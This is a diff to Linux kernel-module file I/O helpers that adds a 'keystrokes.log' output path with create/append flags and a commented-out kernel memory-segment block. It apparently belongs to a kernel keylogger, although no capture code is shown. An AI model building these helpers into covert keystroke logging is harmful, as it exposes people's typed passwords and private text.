@@ -3,7 +3,9 @@
 #include <linux/fs.h>
 
 typedef struct file file;
-
+#define LF_PATH  "keystrokes.log"  //filepath
+#define LF_PERMS 0644  //file permissions (see chmod man for more info)
+#define LF_FLAGS O_RDWR|O_CREAT|O_APPEND  //straight macro
 file* kopen(const char *fp, int flags, int mode);
 int kread(file* file, loff_t off, char *buf, unsigned int size);
 int kwrite(file *file, loff_t off, char* buf, unsigned int size);
@@ -98,4 +100,21 @@ int kwrite(file *file, loff_t off, char *buf, unsigned int size) {
 void kclose(file *file) {
   filp_close(file, NULL);
 }
+
+/*
+ *These methods should be implemented at some point.  (They provide good
+ *encapsulation.)  Although, the KERNEL_DS part should be changed to get_ds(),
+ *as above.  (More general applicability that way.)
+
+static mm_segment_t old_fs;
+
+static inline void begin_kmem(void){
+  old_fs = get_fs();
+  set_fs(KERNEL_DS);
+}
+
+static inline void end_kmem(void){
+  set_fs(old_fs);
+}
+*/
 
